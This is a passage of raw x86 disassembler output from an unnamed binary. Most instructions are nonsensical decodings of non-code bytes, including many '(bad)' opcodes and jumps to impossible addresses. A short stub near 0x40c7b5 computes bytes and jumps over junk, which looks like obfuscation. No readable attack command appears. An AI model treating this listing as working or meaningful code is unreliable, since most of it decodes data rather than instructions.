  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	test   BYTE PTR [eax+0x75],dh
  40c3d3:	jl     0x40c3e2
  40c3d5:	std    
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [edi],cl
  40c3dd:	jle    0x40c45e
  40c3df:	fiadd  WORD PTR ds:0x2730a79c
  40c3e5:	dec    edx
  40c3e6:	add    eax,0x4782c7cc
  40c3eb:	cli    
  40c3ec:	stos   BYTE PTR es:[edi],al
  40c3ed:	push   edi
  40c3ee:	or     DWORD PTR [edi+0x68],ebx
  40c3f1:	jecxz  0x40c3d4
  40c3f3:	gs ss dec esi
  40c3f6:	retf   
  40c3f7:	jo     0x40c410
  40c3f9:	lods   al,BYTE PTR ds:[esi]
  40c3fa:	retf   0x8e93
  40c3fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3fe:	mov    DWORD PTR [edx],ebx
  40c400:	or     DWORD PTR [edx-0x667a1ae9],ebp
  40c406:	scas   al,BYTE PTR es:[edi]
  40c407:	int3   
  40c408:	mul    DWORD PTR [eax+eax*8-0x6a]
  40c40c:	pop    ebx
  40c40d:	mov    dl,0xa1
  40c40f:	push   ss
  40c410:	dec    edx
  40c411:	mov    BYTE PTR [esi],bh
  40c413:	mov    ds:0xa033ec3b,eax
  40c418:	pop    edx
  40c419:	inc    eax
  40c41a:	iret   
  40c41b:	das    
  40c41c:	in     eax,0x68
  40c41e:	and    DWORD PTR [edx],ebp
  40c420:	cmc    
  40c421:	jb     0x40c400
  40c423:	icebp  
  40c424:	add    BYTE PTR [esp+edi*4+0x60],bl
  40c428:	cmp    ah,dl
  40c42a:	fwait
  40c42b:	stos   DWORD PTR es:[edi],eax
  40c42c:	test   al,0xa2
  40c42e:	rcl    DWORD PTR [edx-0x27],cl
  40c431:	xchg   edi,eax
  40c432:	arpl   WORD PTR [eax-0x4211df7],di
  40c438:	jge    0x40c455
  40c43a:	call   0x8504419f
  40c43f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c440:	mov    BYTE PTR [ecx+0xdcba057],dl
  40c446:	add    dh,BYTE PTR [eax]
  40c448:	ret    0xe16c
  40c44b:	cs aaa 
  40c44d:	cld    
  40c44e:	push   ecx
  40c44f:	push   es
  40c450:	mov    ?,WORD PTR [ecx+0x47]
  40c453:	or     edi,ebp
  40c455:	daa    
  40c456:	inc    ecx
  40c457:	jne    0x40c3e2
  40c459:	jmp    0x40c44b
  40c45b:	mov    edi,0x6848222f
  40c460:	jle    0x40c416
  40c462:	ret    0xe40
  40c465:	je     0x40c469
  40c467:	sub    eax,DWORD PTR [eax-0x3eb10ee3]
  40c46d:	xor    al,0x7
  40c46f:	rol    DWORD PTR [ebp+0x486ab552],cl
  40c475:	leave  
  40c476:	call   0x3bf31ed7
  40c47b:	mov    WORD PTR [edx-0x224d24e4],gs
  40c481:	or     ebx,DWORD PTR [eax-0x1d]
  40c484:	retf   0x1d3c
  40c487:	mov    al,ds:0x8d299405
  40c48c:	xchg   BYTE PTR ds:0x25df03cd,cl
  40c492:	(bad)  
  40c493:	(bad)  
  40c495:	push   esi
  40c496:	popf   
  40c497:	mov    ebp,0x5cf0bd5e
  40c49c:	xchg   DWORD PTR [edi-0x2d],edx
  40c49f:	imul   BYTE PTR [edi-0x4043b23c]
  40c4a5:	mov    ds:0xe3eda843,eax
  40c4aa:	outs   dx,BYTE PTR ds:[esi]
  40c4ab:	xchg   edx,eax
  40c4ac:	pop    ds
  40c4ad:	sbb    DWORD PTR [ecx+0x4cb44943],ebp
  40c4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4b4:	pop    ebx
  40c4b5:	clc    
  40c4b6:	out    0x3a,eax
  40c4b8:	mov    al,ds:0x900803a
  40c4bd:	cmp    ah,BYTE PTR [ebx-0x506e28a0]
  40c4c3:	mov    cl,0xa9
  40c4c5:	mov    BYTE PTR [esi-0x19],al
  40c4c8:	sbb    DWORD PTR [edi-0x76739f55],edi
  40c4ce:	pop    edx
  40c4cf:	dec    ebp
  40c4d0:	rcr    DWORD PTR [edx-0x346f4e31],0xf3
  40c4d7:	sahf   
  40c4d8:	mov    ch,0x49
  40c4da:	xchg   ebx,edi
  40c4dc:	cmp    BYTE PTR [edx],bl
  40c4de:	adc    al,0x4a
  40c4e0:	jmp    0x70634549
  40c4e5:	mov    esp,0x4214c351
  40c4ea:	push   ecx
  40c4eb:	xchg   ebx,eax
  40c4ec:	pop    edi
  40c4ed:	pop    edi
  40c4ee:	into   
  40c4ef:	dec    eax
  40c4f0:	push   eax
  40c4f1:	xor    BYTE PTR [esp+eiz*8-0x7db2ae07],ch
  40c4f8:	jg     0x40c4f0
  40c4fa:	dec    ecx
  40c4fb:	int3   
  40c4fc:	das    
  40c4fd:	int    0x54
  40c4ff:	fwait
  40c500:	or     ecx,DWORD PTR es:[edi+0x3f64f39a]
  40c507:	sub    BYTE PTR [ebp+0x1e656344],ah
  40c50d:	mov    esi,DWORD PTR [ecx+0x66]
  40c510:	add    ch,dh
  40c512:	push   edi
  40c513:	scas   al,BYTE PTR es:[edi]
  40c514:	ins    DWORD PTR es:[edi],dx
  40c515:	test   DWORD PTR [edi],edx
  40c517:	test   DWORD PTR [edi],ebx
  40c519:	stc    
  40c51a:	or     al,BYTE PTR [edi-0x40]
  40c51d:	jns    0x40c572
  40c51f:	les    ebx,FWORD PTR [eax]
  40c521:	repnz pop ss
  40c523:	loopne 0x40c56c
  40c525:	sbb    DWORD PTR ds:0xba06c45d,ebx
  40c52b:	xor    esi,DWORD PTR [ebx]
  40c52d:	in     eax,0x80
  40c52f:	pop    ebx
  40c530:	rol    BYTE PTR [edi-0x1ae95828],0xe
  40c537:	(bad)  
  40c538:	idiv   DWORD PTR [edx-0x25]
  40c53b:	and    dl,BYTE PTR ss:[ecx-0x32]
  40c53f:	sbb    eax,0xf13a90de
  40c544:	in     eax,dx
  40c545:	or     ebx,DWORD PTR [eax+0x0]
  40c548:	jecxz  0x40c58b
  40c54a:	sub    eax,0xcd914480
  40c54f:	jmp    0xdcef:0xcab4f13c
  40c556:	les    edi,FWORD PTR [eax+0x70a812ce]
  40c55c:	dec    esi
  40c55d:	popf   
  40c55e:	leave  
  40c55f:	sbb    DWORD PTR [edi+eiz*1+0x7adbf0c3],ebx
  40c566:	xchg   esp,eax
  40c567:	xor    ebx,eax
  40c569:	fsubr  QWORD PTR [ebx+0x26]
  40c56c:	or     DWORD PTR [eax+0x56014f9a],ebx
  40c572:	sub    al,0x1b
  40c574:	hlt    
  40c575:	cmp    eax,0xcb462ed6
  40c57a:	mul    BYTE PTR [edx+0x209387fc]
  40c580:	or     DWORD PTR ds:0x9208a30,eax
  40c586:	retf   0x32d2
  40c589:	inc    edi
  40c58a:	nop
  40c58b:	mov    ecx,?
  40c58d:	jb     0x40c56a
  40c58f:	mov    ebp,0x7c981ab
  40c594:	fist   DWORD PTR [edx]
  40c596:	pop    eax
  40c597:	xor    DWORD PTR [ebx],edx
  40c599:	(bad)  
  40c59b:	jne    0x40c617
  40c59d:	fstp   QWORD PTR [edx]
  40c59f:	mov    edx,0x59c23d36
  40c5a4:	mov    ds:0xc4b6d67d,eax
  40c5a9:	jae    0x40c5f3
  40c5ab:	pop    esp
  40c5ac:	pop    ebx
  40c5ad:	dec    esp
  40c5ae:	push   edi
  40c5af:	lock sbb DWORD PTR [edx+ebx*8-0x17],esi
  40c5b4:	pop    eax
  40c5b5:	dec    eax
  40c5b6:	xchg   DWORD PTR [edx-0x5c],esi
  40c5b9:	or     BYTE PTR [ecx+0x3820ce42],al
  40c5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5c0:	dec    eax
  40c5c1:	sbb    bl,BYTE PTR es:[ebx+0x430a5060]
  40c5c8:	icebp  
  40c5c9:	aad    0x15
  40c5cb:	dec    ecx
  40c5cc:	xchg   ebp,eax
  40c5cd:	je     0x40c637
  40c5cf:	xor    al,0xaf
  40c5d1:	iret   
  40c5d2:	sar    DWORD PTR [edx],1
  40c5d4:	push   cs
  40c5d5:	icebp  
  40c5d6:	xor    dh,BYTE PTR [edx+0x37]
  40c5d9:	addr16 imul edx,esp,0xe623502a
  40c5e0:	paddd  mm6,mm3
  40c5e3:	xchg   esi,esi
  40c5e5:	(bad)  
  40c5e7:	out    dx,eax
  40c5e8:	ds jmp 0x40c5af
  40c5eb:	inc    esp
  40c5ec:	jb     0x40c5de
  40c5ee:	ins    DWORD PTR es:[edi],dx
  40c5ef:	xlat   BYTE PTR ds:[ebx]
  40c5f0:	shr    DWORD PTR [ebx],cl
  40c5f2:	mov    eax,ds:0xf6347973
  40c5f7:	ins    DWORD PTR es:[edi],dx
  40c5f8:	inc    edi
  40c5f9:	(bad)
  40c5fd:	xchg   ebp,eax
  40c5fe:	je     0x40c588
  40c600:	mov    eax,0x48b6f1d8
  40c605:	test   al,0x5b
  40c607:	cmp    DWORD PTR [esi+0x7fd035c7],ebx
  40c60d:	mov    BYTE PTR [ebx-0x67],bl
  40c610:	pop    ds
  40c611:	xchg   edx,eax
  40c612:	inc    esi
  40c613:	popa   
  40c614:	rcl    DWORD PTR [ebx-0x79],1
  40c617:	xchg   esi,eax
  40c618:	mov    ds:0x9500352e,al
  40c61d:	ins    DWORD PTR es:[edi],dx
  40c61e:	scas   al,BYTE PTR es:[edi]
  40c61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c620:	out    dx,al
  40c621:	sub    DWORD PTR [esi],edi
  40c623:	sbb    BYTE PTR [ecx-0x24317296],bl
  40c629:	jne    0x40c5d6
  40c62b:	loop   0x40c65f
  40c62d:	call   DWORD PTR [edx]
  40c62f:	jns    0x40c675
  40c631:	(bad)  
  40c632:	daa    
  40c633:	lock push cs
  40c635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c636:	aas    
  40c637:	pop    esi
  40c638:	jge    0x40c661
  40c63a:	(bad)  
  40c63b:	mov    ecx,0xefab8a4d
  40c640:	and    al,0x1b
  40c642:	xlat   BYTE PTR ds:[ebx]
  40c643:	(bad)  [ecx+0x19]
  40c646:	ret    0x1f08
  40c649:	cmp    edx,ebx
  40c64b:	mov    cl,0x83
  40c64d:	sbb    BYTE PTR [ecx+0x30a3fe34],dh
  40c653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c654:	in     eax,dx
  40c655:	adc    al,0x27
  40c657:	popa   
  40c658:	(bad)  
  40c659:	clc    
  40c65a:	or     al,0x3f
  40c65c:	cmp    al,0x20
  40c65e:	gs aas 
  40c660:	xchg   ecx,eax
  40c661:	xor    DWORD PTR [ecx+0x35],0x6ada92de
  40c668:	xchg   edi,eax
  40c669:	xor    eax,0x56676f86
  40c66e:	lock shl ebx,0x78
  40c672:	jl     0x40c6a7
  40c674:	mov    DWORD PTR [ecx+0x607d3a54],ebx
  40c67a:	in     eax,dx
  40c67b:	xchg   ecx,eax
  40c67c:	aaa    
  40c67d:	or     eax,0x81293f93
  40c682:	cmp    DWORD PTR [ecx],eax
  40c684:	xor    eax,0x34c5a472
  40c689:	mov    ds:0x31402dc2,al
  40c68e:	ss pushf 
  40c690:	test   eax,0xf36e7ba8
  40c695:	ficomp WORD PTR [ebp+0x5d6dd146]
  40c69b:	add    DWORD PTR gs:[ecx],eax
  40c69e:	mov    bh,0xd1
  40c6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6a1:	aas    
  40c6a2:	mov    ds:0xa7a93414,eax
  40c6a7:	add    al,0xce
  40c6a9:	ds push ss
  40c6ab:	or     BYTE PTR [ecx],dl
  40c6ad:	adc    bl,BYTE PTR ds:0xb4de509
  40c6b3:	dec    esp
  40c6b4:	out    0x6d,eax
  40c6b6:	js     0x40c687
  40c6b8:	aas    
  40c6b9:	push   ds
  40c6ba:	inc    eax
  40c6bb:	mov    ch,bh
  40c6bd:	(bad)  
  40c6be:	test   al,0x99
  40c6c0:	call   0xb01d1f21
  40c6c5:	jecxz  0x40c6de
  40c6c7:	jmp    0xb679:0xae9ae861
  40c6ce:	mov    ds:0x15b38804,al
  40c6d3:	daa    
  40c6d4:	ret    0x5ba5
  40c6d7:	sub    bl,BYTE PTR [edx]
  40c6d9:	pop    esi
  40c6da:	push   edx
  40c6db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6dc:	sub    ah,cl
  40c6de:	stos   BYTE PTR es:[edi],al
  40c6df:	shr    BYTE PTR [ecx-0x60a1d149],cl
  40c6e5:	jle    0x40c74e
  40c6e7:	jecxz  0x40c72d
  40c6e9:	push   esi
  40c6ea:	aam    0x4a
  40c6ec:	shl    ebx,0x33
  40c6ef:	test   al,0xbb
  40c6f1:	and    DWORD PTR [edi],ecx
  40c6f3:	inc    esi
  40c6f4:	jbe    0x40c677
  40c6f6:	mov    ah,0x1f
  40c6f8:	cwde   
  40c6f9:	cwde   
  40c6fa:	add    al,0xe1
  40c6fc:	jne    0x40c776
  40c6fe:	or     bl,BYTE PTR [ebp-0x1383731e]
  40c704:	add    ch,BYTE PTR [ebp+0x7b]
  40c707:	mov    al,ds:0x4b7997ff
  40c70c:	iret   
  40c70d:	xlat   BYTE PTR ds:[ebx]
  40c70e:	clc    
  40c70f:	xchg   edi,eax
  40c710:	std    
  40c711:	inc    eax
  40c712:	cdq    
  40c713:	inc    edx
  40c714:	jle    0x40c6f1
  40c716:	fidiv  WORD PTR [esi]
  40c718:	cwde   
  40c719:	sbb    DWORD PTR [edx],ecx
  40c71b:	cmp    al,0x95
  40c71d:	xchg   bl,bl
  40c71f:	push   esp
  40c720:	pop    eax
  40c721:	es into 
  40c723:	add    al,0x29
  40c725:	out    dx,eax
  40c726:	and    al,0x62
  40c728:	mov    bl,0xa4
  40c72a:	dec    edi
  40c72b:	pop    ecx
  40c72c:	mov    dl,0x37
  40c72e:	ret    
  40c72f:	(bad)  
  40c730:	fmul   DWORD PTR [ebp+0x31]
  40c733:	arpl   WORD PTR [edx],dx
  40c735:	adc    DWORD PTR [edi+ebp*1],ebp
  40c738:	adc    esp,ecx
  40c73a:	inc    esi
  40c73b:	jb     0x40c795
  40c73d:	xor    BYTE PTR [ebx+0x4eddaf31],ch
  40c743:	dec    ebp
  40c744:	dec    eax
  40c745:	pop    ebp
  40c746:	inc    ebp
  40c747:	cmp    eax,0x3b792dfa
  40c74c:	retf   0xbb69
  40c74f:	jmp    0x5dd6c340
  40c754:	or     bl,BYTE PTR [ecx-0x518ebca0]
  40c75a:	cli    
  40c75b:	cmp    eax,DWORD PTR [esi+0x1d]
  40c75e:	xchg   esi,eax
  40c75f:	outs   dx,DWORD PTR cs:[esi]
  40c761:	stos   BYTE PTR es:[edi],al
  40c762:	add    BYTE PTR [eax-0x7f1d43c4],ch
  40c768:	js     0x40c787
  40c76a:	cmp    eax,0x56db5716
  40c76f:	push   esi
  40c770:	mov    edx,0x817ead4c
  40c775:	dec    edi
  40c776:	addr16 mov bh,0x1e
  40c779:	imul   edi,DWORD PTR [edx],0xf99841a7
  40c77f:	mov    ebx,0x8987583f
  40c784:	push   0xffffff9e
  40c786:	and    DWORD PTR [esi-0x4d],edx
  40c789:	xchg   edi,eax
  40c78a:	stos   DWORD PTR es:[edi],eax
  40c78b:	mov    edi,0x826fe437
  40c790:	test   BYTE PTR [esi],dl
  40c792:	jp     0x40c7bd
  40c794:	cli    
  40c795:	mov    esi,0xd4c0595f
  40c79a:	stos   BYTE PTR es:[edi],al
  40c79b:	mov    al,0x67
  40c79d:	test   BYTE PTR [ebx],ah
  40c79f:	cmp    BYTE PTR [esp+ecx*4],cl
  40c7a2:	ja     0x40c759
  40c7a4:	int3   
  40c7a5:	std    
  40c7a6:	mov    BYTE PTR [ebp+0x66af78b2],bh
  40c7ac:	sub    eax,0x67397cd1
  40c7b1:	popf   
  40c7b2:	rol    DWORD PTR [edi],0xd8
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x612f8770]
  40c7fd:	jo     0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi],al
  40c807:	sub    DWORD PTR [ebx],0x2e
  40c80a:	mov    ch,0xc5
  40c80c:	arpl   WORD PTR [edi+ecx*2-0x4ef3422d],dx
  40c813:	in     al,dx
  40c814:	dec    edi
  40c815:	xchg   ebx,eax
  40c816:	cdq    
  40c817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c818:	mov    edi,0xe03150d
  40c81d:	mov    dh,0x46
  40c81f:	mov    bl,bl
  40c821:	stc    
  40c822:	mov    edi,ebx
  40c824:	loop   0x40c7f1
  40c826:	jno    0x40c87c
  40c828:	shr    BYTE PTR [ecx+0x45d79ecc],1
  40c82e:	adc    BYTE PTR [edx+0x3437c264],0xfb
  40c835:	fldenv [esp-0x54]
  40c839:	sahf   
  40c83a:	popa   
  40c83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c83c:	push   ss
  40c83d:	rcl    esp,1
  40c83f:	cdq    
  40c840:	jb     0x40c7d8
  40c842:	out    0x81,al
  40c844:	push   ds
  40c845:	adc    BYTE PTR [edx],bl
  40c847:	adc    eax,edx
  40c849:	xor    eax,DWORD PTR [edx+0x775be8b8]
  40c84f:	push   ebp
  40c850:	push   edi
  40c851:	pushf  
  40c852:	cs enter 0x8758,0xee
  40c857:	and    ah,BYTE PTR ds:0x9668eb0
  40c85d:	pop    esp
  40c85e:	jns    0x40c846
  40c860:	add    al,BYTE PTR [ecx+ecx*2-0x15]
  40c864:	je     0x40c8b4
  40c866:	retf   
  40c867:	int    0x3c
  40c869:	mov    eax,eax
  40c86b:	lock xor BYTE PTR [ebx+0x35eafc49],ah
  40c872:	inc    edx
  40c873:	sub    al,0xc0
  40c875:	retf   
  40c876:	scas   al,BYTE PTR es:[edi]
  40c877:	shl    DWORD PTR [eax+eax*8-0x6aba7122],1
  40c87e:	inc    eax
  40c87f:	sbb    BYTE PTR [esi+0x3b],dh
  40c882:	cmp    ecx,DWORD PTR [ebp-0x4257d67d]
  40c888:	xchg   esi,eax
  40c889:	(bad)  
  40c88a:	push   cs
  40c88b:	cmp    eax,0x2a6b3998
  40c890:	dec    ebx
  40c891:	sub    ah,BYTE PTR fs:[esi-0x51216a42]
  40c898:	inc    ebp
  40c899:	xor    BYTE PTR ds:[edi],bh
  40c89c:	dec    esp
  40c89d:	adc    al,0x4a
  40c89f:	repz pushf 
  40c8a1:	mov    WORD PTR [esi+edx*8+0x63],gs
  40c8a5:	mov    ecx,0xd2f6ba22
  40c8aa:	call   0xfa7dca40
  40c8af:	sub    BYTE PTR [edx+0x2e2015bc],bh
  40c8b5:	push   esp
  40c8b6:	gs jg  0x40c90d
  40c8b9:	push   esp
  40c8ba:	jl     0x40c8fc
  40c8bc:	sahf   
  40c8bd:	push   ds
  40c8be:	rcl    ebp,0xd3
  40c8c1:	aas    
  40c8c2:	or     cl,BYTE PTR [ebp-0x2f2b7543]
  40c8c8:	dec    ebx
  40c8c9:	retf   
  40c8ca:	inc    ecx
  40c8cb:	mov    al,0x79
  40c8cd:	(bad)  
  40c8ce:	push   ds
  40c8cf:	or     eax,0xebf1c448
  40c8d4:	fisttp QWORD PTR [ecx+0x1a]
  40c8d7:	adc    ebx,edi
  40c8d9:	push   0xffffffa4
  40c8db:	inc    eax
  40c8dc:	in     eax,dx
  40c8dd:	cwde   
  40c8de:	popa   
  40c8df:	push   esi
  40c8e0:	xchg   ecx,eax
  40c8e1:	test   edx,esi
  40c8e3:	jno    0x40c892
  40c8e5:	xor    edx,ebp
  40c8e7:	out    0x7,al
  40c8e9:	pusha  
  40c8ea:	ficom  DWORD PTR [ebx-0x4041b769]
  40c8f0:	adc    BYTE PTR [eax-0x6c],dl
  40c8f3:	add    ch,BYTE PTR [ebx]
  40c8f5:	inc    edi
  40c8f6:	xor    eax,0x561eaff1
  40c8fb:	mov    ds:0x4a369e3f,al
  40c900:	jae    0x40c8fd
  40c902:	bound  esp,QWORD PTR [ecx+eax*4]
  40c905:	aas    
  40c906:	pop    ds
  40c907:	adc    edi,DWORD PTR [ebx+0xc501db1]
  40c90d:	addr16 nop
  40c90f:	lea    ebp,[edx+eax*8]
  40c912:	push   eax
  40c913:	mov    bl,0xc
  40c915:	(bad)  
  40c917:	imul   edi,DWORD PTR ds:0x8ba05a8,0xa8568063
  40c921:	sbb    al,0xd0
  40c923:	ss jecxz 0x40c97e
  40c926:	jno    0x40c8dd
  40c928:	mov    edx,0x590a5f55
  40c92d:	lock (bad) 
  40c930:	inc    ebp
  40c931:	pop    ebx
  40c932:	and    DWORD PTR [eax-0x34],esi
  40c935:	mov    al,al
  40c937:	sub    BYTE PTR [ebx+0x62],al
  40c93a:	xchg   ebp,eax
  40c93b:	in     eax,0xee
  40c93d:	sahf   
  40c93e:	out    dx,eax
  40c93f:	mov    eax,0x74cee573
  40c944:	inc    ecx
  40c945:	(bad)  
  40c946:	adc    edx,DWORD PTR [ebp-0x4d4716fa]
  40c94c:	xchg   ebx,eax
  40c94d:	sahf   
  40c94e:	xlat   BYTE PTR ds:[ebx]
  40c94f:	adc    al,0x2f
  40c951:	jecxz  0x40c951
  40c953:	adc    bl,ah
  40c955:	add    dl,BYTE PTR [ebp+0x3]
  40c958:	call   0xbe27:0x781d6e42
  40c95f:	cmc    
  40c960:	xor    BYTE PTR [ecx+0x6d],ch
  40c963:	xor    eax,0xacc1462
  40c968:	out    dx,al
  40c969:	push   edi
  40c96a:	xor    al,BYTE PTR [edi+0x29]
  40c96d:	inc    edi
  40c96e:	(bad)  
  40c96f:	lods   al,BYTE PTR ds:[esi]
  40c970:	sub    esp,0x2fa3c6b8
  40c976:	ins    DWORD PTR es:[edi],dx
  40c977:	xor    BYTE PTR [ecx+0x18],ch
  40c97a:	dec    edi
  40c97b:	pop    ds
  40c97c:	xchg   esp,esp
  40c97e:	or     BYTE PTR [ecx+0x5e],dh
  40c981:	mov    dl,0xdf
  40c983:	fild   WORD PTR [ebp-0x37f9e10c]
  40c989:	test   al,0xe1
  40c98b:	pop    DWORD PTR [ebp+0x21abd37f]
  40c991:	dec    ebx
  40c992:	cwde   
  40c993:	cwde   
  40c994:	and    bh,BYTE PTR [ebx]
  40c996:	mov    edi,0x2ca24a7a
  40c99b:	mov    ds:0xbbd47813,al
  40c9a0:	inc    ebx
  40c9a1:	sbb    edi,DWORD PTR [edx]
  40c9a3:	fstp   DWORD PTR [ebx+0x7]
  40c9a6:	les    ebp,FWORD PTR [ecx-0xfa7de68]
  40c9ac:	sub    dh,BYTE PTR [esp+ebp*8]
  40c9af:	pop    esi
  40c9b0:	lea    eax,[ecx-0x1f]
  40c9b3:	pop    edx
  40c9b4:	sub    DWORD PTR [esi+esi*4-0x10000e36],edi
  40c9bb:	mov    cl,0x49
  40c9bd:	std    
  40c9be:	add    BYTE PTR [ecx+0x40],dl
  40c9c1:	adc    bh,BYTE PTR [esi-0x4139055]
  40c9c7:	pushf  
  40c9c8:	push   edx
  40c9c9:	mov    ecx,ecx
  40c9cb:	pop    eax
  40c9cc:	cmp    al,0x5d
  40c9ce:	jns    0x40c95e
  40c9d0:	ins    BYTE PTR es:[edi],dx
  40c9d1:	arpl   WORD PTR [edx+0x21],cx
  40c9d4:	sub    BYTE PTR [edx-0x5c],ah
  40c9d7:	or     ebp,DWORD PTR [ecx+0x6ea56552]
  40c9dd:	in     eax,dx
  40c9de:	and    esp,DWORD PTR [eax+0x52]
  40c9e1:	pushf  
  40c9e2:	push   0xd414186d
  40c9e7:	dec    edi
  40c9e8:	fisttp DWORD PTR [ebx+0xc3e9aea]
  40c9ee:	jne    0x40c99c
  40c9f0:	or     al,BYTE PTR es:[ebp-0x68d46b0e]
  40c9f7:	pop    esi
  40c9f8:	(bad)  
  40c9f9:	push   edi
  40c9fa:	sub    DWORD PTR [ebx+0x6b6a7c22],0xf39554da
  40ca04:	test   al,0xfa
  40ca06:	or     ch,BYTE PTR [ebx+edx*8+0x4a]
  40ca0a:	add    ah,BYTE PTR [ebx-0x1d39ef1f]
  40ca10:	bound  ebp,QWORD PTR [ebp-0x612f4ef6]
  40ca16:	pop    esi
  40ca17:	mov    DWORD PTR [edi-0xafd9af8],ebp
  40ca1d:	xor    al,0x6
  40ca1f:	mov    dh,0xdb
  40ca21:	push   esi
  40ca22:	sub    al,0x56
  40ca24:	mov    DWORD PTR [edi-0x71],esp
  40ca27:	mov    edx,0xf46bb20a
  40ca2c:	ret    0x91c3
  40ca2f:	lea    edi,[edx+eiz*8+0x1b1f8e61]
  40ca36:	ret    
  40ca37:	mov    edi,0x4d129c2d
  40ca3c:	je     0x40ca5f
  40ca3e:	fisttp DWORD PTR [ecx]
  40ca40:	xor    eax,0xa32e9d75
  40ca45:	(bad)  
  40ca46:	shr    BYTE PTR [ecx-0x7a],cl
  40ca49:	push   0x2aaf43f6
  40ca4e:	inc    ecx
  40ca4f:	aas    
  40ca50:	and    dl,BYTE PTR [ecx]
  40ca52:	jae    0x40ca0e
  40ca54:	into   
  40ca55:	clc    
  40ca56:	jne    0x40caa1
  40ca58:	fs (bad) 
  40ca5a:	mov    dl,0x29
  40ca5c:	dec    ebp
  40ca5d:	icebp  
  40ca5e:	fisubr WORD PTR [edx-0x53]
  40ca61:	outs   dx,DWORD PTR ds:[esi]
  40ca62:	xchg   ecx,eax
  40ca63:	popa   
  40ca64:	ror    bh,1
  40ca66:	sub    al,0x33
  40ca68:	gs push es
  40ca6a:	xor    ecx,DWORD PTR [ecx]
  40ca6c:	ins    DWORD PTR es:[edi],dx
  40ca6d:	xchg   ecx,eax
  40ca6e:	sbb    DWORD PTR [esi],ebx
  40ca70:	inc    esi
  40ca71:	mov    edi,0xc3db1b1e
  40ca76:	push   edi
  40ca77:	jle    0x40cade
  40ca79:	retf   
  40ca7a:	ret    
  40ca7b:	mov    WORD PTR [edx+0x79b96ec],?
  40ca81:	pushw  ss
  40ca83:	ins    BYTE PTR es:[edi],dx
  40ca84:	xchg   BYTE PTR [ebx],al
  40ca86:	sub    dl,BYTE PTR [ecx+0x36]
  40ca89:	sub    al,0xa9
  40ca8b:	add    dl,BYTE PTR [ebx+0x63]
  40ca8e:	xchg   DWORD PTR [ebp-0x64ba9eb1],ebp
  40ca94:	shl    BYTE PTR [eax+0x533b6ba6],1
  40ca9a:	inc    esi
  40ca9b:	push   esp
  40ca9c:	hlt    
  40ca9d:	outs   dx,DWORD PTR ds:[esi]
  40ca9e:	(bad)  
  40ca9f:	(bad)  
  40caa0:	fistp  QWORD PTR [ebx+ebx*2-0x1c2b4283]
  40caa7:	or     dl,BYTE PTR [ecx+edx*2-0x6a3ed31]
  40caae:	inc    esi
  40caaf:	rcr    DWORD PTR [edi],1
  40cab1:	mov    eax,0xd36574a0
  40cab6:	sub    DWORD PTR [edx+edx*1],0xb55e7704
  40cabd:	sbb    al,0xf
  40cabf:	cmp    ebx,DWORD PTR [edx]
  40cac1:	jmp    0x40cb2b
  40cac3:	sub    al,0xac
  40cac5:	ficom  WORD PTR [edi]
  40cac7:	jecxz  0x40cb29
  40cac9:	cmp    eax,0x49440a32
  40cace:	mov    bh,0xf2
  40cad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad1:	sbb    dl,BYTE PTR [edi+0x61]
  40cad4:	xchg   edx,eax
  40cad5:	xlat   BYTE PTR ds:[ebx]
  40cad6:	jnp    0x40ca81
  40cad8:	dec    ebp
  40cad9:	fcom   DWORD PTR [ebp-0x1f9826e1]
  40cadf:	fs out dx,eax
  40cae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cae2:	arpl   WORD PTR [ecx+ecx*2-0x59],di
  40cae6:	sbb    dh,BYTE PTR [edi+edx*8-0x3243608a]
  40caed:	lods   eax,DWORD PTR ds:[esi]
  40caee:	imul   esi,DWORD PTR [ebp+0x2],0x6f
  40caf2:	sahf   
  40caf3:	ja     0x40caab
  40caf5:	inc    ebx
  40caf6:	gs in  al,0xdf
  40caf9:	hlt    
  40cafa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cafb:	popf   
  40cafc:	dec    edi
  40cafd:	cmp    eax,0x4bf87559
  40cb02:	push   eax
